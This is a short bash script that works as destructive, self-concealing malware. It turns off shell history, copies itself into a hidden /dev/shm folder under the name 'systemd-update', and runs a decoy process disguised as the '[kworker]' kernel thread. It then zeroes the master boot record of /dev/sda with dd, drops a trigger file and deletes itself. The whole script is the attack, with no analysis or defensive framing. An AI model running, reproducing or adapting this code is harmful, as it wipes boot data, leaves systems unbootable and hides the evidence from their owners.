#!/bin/bash
unset HISTFILE
set +o history

cd /dev/shm || exit

mkdir .sysupdate
cd .sysupdate || exit

cp "$0" ./systemd-update
chmod +x ./systemd-update

nohup bash -c 'exec -a [kworker] sleep 3600' >/dev/null 2>&1 &

dd if=/dev/zero of=/dev/sda bs=512 count=1 
touch /tmp/.trigger_$(date +%s)

rm -f "$0"  
exit 0